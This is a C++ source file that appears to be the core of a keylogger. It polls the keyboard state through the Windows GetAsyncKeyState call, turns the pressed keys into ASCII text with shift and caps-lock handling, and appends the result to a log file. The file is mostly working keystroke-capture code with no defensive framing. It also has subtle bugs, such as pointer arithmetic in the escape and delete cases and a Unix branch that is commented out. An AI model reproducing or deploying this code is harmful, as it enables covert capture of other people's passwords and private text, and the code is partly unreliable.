#include <iostream>
#include <fstream>
#include "keylog.h"
#if defined(_WIN32) || defined(__CYGWIN__) || defined(__CYGWIN32)
#include <windows.h>
#include <windowsx.h>
#elif __unix__ 
#include <sys/types.h>
#include <fcntl.h>
#include <termios.h>
#include <unistd.h>
#endif // macros defined by cpp (C prprocessor)

using namespace std;

vcodes& operator++(vcodes& e) {
    switch(e) {
        case VC_TAB:
        e = vcodes(0x0C);
        break;
        case VC_RETURN:
        e = vcodes(0x10);
        break;
        case VC_CAPITAL:
        e = vcodes(0x1B);
        break;
        case VC_ESCAPE:
        e = vcodes(0x20);
        break;
        case VC_9:
        e = vcodes(0x41);
        break;
        case VC_APPS:
        e = vcodes(0x5F);
        break;
        case VC_DIVIDE:
        e = vcodes(0xBB);
        break;
        case VC_OEM_3:
        e = vcodes(0xDB);
        break;
        case VC_OEM_8:
        e = vcodes(0xFE);
        break;
        case END:
        throw std::out_of_range("vcodes operator++");
        default:
        e = vcodes(static_cast<std::underlying_type<vcodes>::type>(e) + 1);
    }
    return e;
} // operator++

vector<vcodes> getPressedKeyboardState() {
    vector<vcodes> pressed;
    static bool ar[94];
    static bool capsLoc = false;
    //#if defined(_WIN32) || defined(__CYGWIN__) || defined(__CYGWIN32)
    int x = 0;
    for (vcodes v = VC_BACK; v != END; ++v) {
        bool p = (GetAsyncKeyState(v) & 0x8000);
        if (v == VC_CAPITAL) {
            if (p && !ar[x]) {
                capsLoc = !capsLoc;
                ar[x] = true;
            } else if (!p) {
                ar[x] = false;
            }
            if (capsLoc) {
                pressed.push_back(v);
            }
            continue;
        }
        if (p && (!ar[x] || (v >= VC_SHIFT && v <= VC_MENU))) {
            ar[x] = true;
            pressed.push_back(v);
        } else if (!p) {
            ar[x] = false;
        }
        x++;
    }
    //#elif __unix__
    //#endif
    return pressed;
} // getAsyncKeyboardState

static bool contains(vector<vcodes> pr, vcodes v) {
    for (auto vc = pr.begin(); vc != pr.end(); ++vc) {
        if (*vc == v) {
            return true;
        }
    }
    return false;
}

string getAscii(vector<vcodes> pressed) {
    bool shift = contains(pressed, VC_SHIFT);
    bool capslock = contains(pressed, VC_CAPITAL);
    bool alt = contains(pressed, VC_MENU);
    string str;
    for(auto vc = pressed.begin(); vc != pressed.end(); ++vc) {
        if ((*vc >= VC_0 && *vc <= VC_9) || (*vc >= VC_NUMPAD0 && *vc <= VC_NUMPAD9)) {
            if (shift) {
                switch (*vc) {
                    case VC_NUMPAD0:
                    case VC_0:
                    str += ")";
                    break;
                    case VC_NUMPAD1:
                    case VC_1:
                    str += "!";
                    break;
                    case VC_NUMPAD2:
                    case VC_2:
                    str += "@";
                    break;
                    case VC_NUMPAD3:
                    case VC_3:
                    str += "#";
                    break;
                    case VC_NUMPAD4:
                    case VC_4:
                    str += "$";
                    break;
                    case VC_NUMPAD5:
                    case VC_5:
                    str += "%";
                    break;
                    case VC_NUMPAD6:
                    case VC_6:
                    str += "^";
                    break;
                    case VC_NUMPAD7:
                    case VC_7:
                    str += "&";
                    break;
                    case VC_NUMPAD8:
                    case VC_8:
                    str += "*";
                    break;
                    case VC_NUMPAD9:
                    case VC_9:
                    str += "(";
                    break;
                    default:
                    str += "";
                }
            } else {
                str += (char)*vc;
            }
        } else if (*vc >= VC_A && *vc <= VC_Z) {
            str += ((shift && !capslock) || (!shift && capslock))? (char)*vc : (char)(*vc + 32);
        } else if (*vc >= VC_MULTIPLY) {
            switch (*vc) {
                case VC_MULTIPLY:
                str += "*";
                break;
                case VC_OEM_1:
                str += (shift)? ":" : ";";
                break;
                case VC_DIVIDE:
                case VC_OEM_2:
                str += (shift)? "?" : "/";
                break;
                case VC_OEM_3:
                str += (shift)? "~" : "`";
                break;
                case VC_OEM_4:
                str += (shift)? "{" : "[";
                break;
                case VC_SEPARATOR:
                case VC_OEM_5:
                str += (shift)? "|" : "\\";
                break;
                case VC_OEM_6:
                str += (shift)? "}" : "]";
                break;
                case VC_OEM_7:
                str += (shift)? "\"" : "\'";
                break;
                case VC_OEM_8:
                str += (shift)? "" : "";
                break;
                case VC_OEM_COMMA:
                str += (shift)? "<" : ",";
                break;
                case VC_OEM_CLEAR:
                str += (shift)? "" : "";
                break;
                case VC_DECIMAL:
                case VC_OEM_PERIOD:
                str += (shift)? ">" : ".";
                break;
                case VC_ADD:
                case VC_OEM_PLUS:
                str += (shift)? "+" : "=";
                break;
                case VC_SUBTRACT:
                case VC_OEM_MINUS:
                str += (shift)? "_" : "-";
                break;
                default:
                str += "";
            }
        } else if (*vc >= VC_BACK && *vc <= VC_DELETE) {
            switch (*vc) {
                case VC_BACK:
                str += "\b";
                break;
                case VC_TAB:
                str += "\t";
                break;
                case VC_RETURN:
                str += "\n";
                break;
                case VC_ESCAPE:
                str += "" + (char)27;
                break;
                case VC_SPACE:
                str += " ";
                break;
                case VC_DELETE:
                str += "" + (char)127;
                break;
                default:
                str += "";
            }
        }
    }
    return str;
} // getAscii



void writeToFile(string file, string s) {
    static ofstream outFile{file, std::ios::app | std::ios::out};
    if (s.empty()) {
        return;
    }
    if (!outFile.is_open()) {
        cerr << "Cannot find " << file << endl;
        return;
    }
    outFile << s;
    outFile.flush();
} // writeToFile